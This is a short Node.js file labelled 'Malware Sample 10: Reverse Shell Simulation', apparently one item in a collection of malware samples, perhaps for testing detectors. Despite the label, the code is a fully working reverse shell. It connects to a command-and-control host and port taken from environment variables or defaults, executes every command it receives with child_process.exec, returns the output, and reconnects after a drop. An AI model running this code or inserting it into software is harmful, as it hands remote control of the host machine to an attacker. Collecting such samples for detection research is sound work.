// Malware Sample 10: Reverse Shell Simulation
// Pattern: Network connection -> command execution loop
const net = require('net');
const { exec } = require('child_process');

const C2_HOST = process.env.C2_SERVER || '192.168.1.100';
const C2_PORT = process.env.C2_PORT || 4444;

// Dangerous: Creates reverse shell connection
const client = new net.Socket();

client.connect(C2_PORT, C2_HOST, () => {
    console.log('Connected to C2 server');
    client.write('Reverse shell established\n');
});

client.on('data', (data) => {
    const command = data.toString().trim();

    // Dangerous: Executes commands from remote server
    exec(command, (error, stdout, stderr) => {
        if (error) {
            client.write(`Error: ${error.message}\n`);
            return;
        }
        if (stderr) {
            client.write(`stderr: ${stderr}\n`);
            return;
        }
        client.write(stdout);
    });
});

client.on('close', () => {
    console.log('Connection closed, attempting reconnect...');
    setTimeout(() => {
        client.connect(C2_PORT, C2_HOST);
    }, 5000);
});

client.on('error', (err) => {
    console.error('Connection error:', err.message);
});
